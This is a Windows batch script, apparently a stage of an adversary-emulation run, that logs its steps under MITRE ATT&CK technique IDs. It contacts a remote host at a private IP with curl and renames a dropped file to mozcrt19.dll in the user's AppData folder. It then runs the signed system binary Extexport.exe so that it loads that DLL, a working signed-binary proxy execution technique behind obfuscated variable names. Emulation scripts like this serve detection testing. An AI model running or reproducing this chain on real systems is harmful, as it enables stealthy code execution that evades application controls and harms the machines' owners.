@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET douyiw=%APPDATA%\10211\97305690
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?10211-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=visio.txt
SET rgnpbq=10211
SET logvar=%APPDATA%\!fkesh!\macula-simulations.log
SET tmpdir=%APPDATA%\!fkesh!

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: stage2_start=>> "!logvar!" 2>nul
echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: heartbeat_start=>> "!logvar!" 2>nul
curl -k -s -o nul "!frytcn!"
if not errorlevel 1 (SET RESULT=1&SET ERR=) else (SET RESULT=0&SET ERR=connection_failed)
echo [!DATE! !TIME!][TTP][!eykalkg!][!rgnpbq!]: T1105|Ingress_Tool_Transfer=!RESULT!:!ERR!>> "!logvar!" 2>nul

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: file_rename_start=>> "!logvar!" 2>nul
if exist "!douyiw!\!ecrfwq!" (
    ren "!douyiw!\!ecrfwq!" mozcrt19.dll
    if exist "!douyiw!\mozcrt19.dll" (SET RESULT2=1&SET ERR2=) else (SET RESULT2=0&SET ERR2=rename_failed)
) else (SET RESULT2=0&SET ERR2=source_missing)
echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: file_rename_complete=!RESULT2!>> "!logvar!" 2>nul

if !RESULT2! equ 1 (
    echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: extexport_start=>> "!logvar!" 2>nul
    %SystemRoot%\System32\Extexport.exe "!douyiw!" foo bar
    if not errorlevel 1 (SET RESULT3=1&SET ERR3=) else (SET RESULT3=0&SET ERR3=execution_failed)
) else (SET RESULT3=0&SET ERR3=prereq_failed)
echo [!DATE! !TIME!][TTP][!eykalkg!][!rgnpbq!]: T1218|Signed_Binary_Proxy_Execution=!RESULT3!:!ERR3!>> "!logvar!" 2>nul
ENDLOCAL